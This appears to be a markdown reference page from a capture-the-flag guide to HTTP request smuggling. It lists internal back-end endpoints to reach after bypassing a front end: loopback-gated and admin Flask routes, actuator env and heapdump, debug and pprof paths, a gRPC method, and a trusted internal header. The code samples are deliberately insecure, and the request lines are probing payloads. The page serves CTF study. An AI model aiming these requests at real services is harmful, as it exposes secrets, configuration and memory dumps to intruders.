# Internal API — the back-end's private endpoints

## The loopback-only API — `127.0.0.1:port` inside the back-end

```python
@app.route('/internal/flag')
def flag():
    if request.remote_addr != '127.0.0.1':
        return 403
    return open('/flag.txt').read()
```

The route gated on `127.0.0.1` — the smuggle reaches it as the back-end
— `internal-routes.md`.

## The admin-API — `/admin/*` filtered on the front

```python
@app.route('/admin/config')
def config():
    return jsonify(settings)
```

`/admin/*` blocked by the front's WAF — the smuggle reaches it —
`frontend-bypass.md`.

## The metrics-API — `/metrics` / `/actuator`

```text
GET /metrics HTTP/1.1
GET /actuator/env HTTP/1.1
GET /actuator/configprops HTTP/1.1
GET /actuator/heapdump HTTP/1.1
```

The observability endpoints — a flag in a metric/env — `flag-locations.md`.

## The debug-API — `/debug`, `/_debug`, `/__debug__`

```text
GET /debug/routes HTTP/1.1
GET /__debug__/toolbar HTTP/1.1
GET /debug/pprof HTTP/1.1
```

The debug endpoints — route-listing, profiling, REPL — the flag in a
debug-dump.

## The health-API — `/health`, `/healthz`, `/status`

```text
GET /health HTTP/1.1
GET /healthz HTTP/1.1
```

The health-check — the internal status — the flag in a status-field.

## The internal-API-version — `/internal/v1/flag`

```text
GET /internal/v1/flag HTTP/1.1
```

A versioned internal API — the internal namespace.

## The grpc-API — the binary-protocol

```text
POST /internal.Greeter/SayFlag HTTP/1.1
Content-Type: application/grpc
```

A gRPC endpoint — the binary-protocol — the smuggle's body is protobuf —
`skills/web-ssrf/references/protocol-smuggling.md`.

## The trusted-header API — `X-Internal-Request: true`

```text
GET /internal/flag HTTP/1.1
X-Internal-Request: true
```

A header the internal API trusts — the smuggle's `X-Internal-Request`
— `advanced-headers.md`.

## The port-API — `Host: t:8080` internal listener

```text
GET /flag HTTP/1.1
Host: t:8080
```

A listener on an internal port — `internal-routes.md`.

## The unix-socket — `/var/run/internal.sock`

A unix-socket listener — the smuggle's `Host:` can't reach it — a
denied-condition — `denied-conditions.md`.
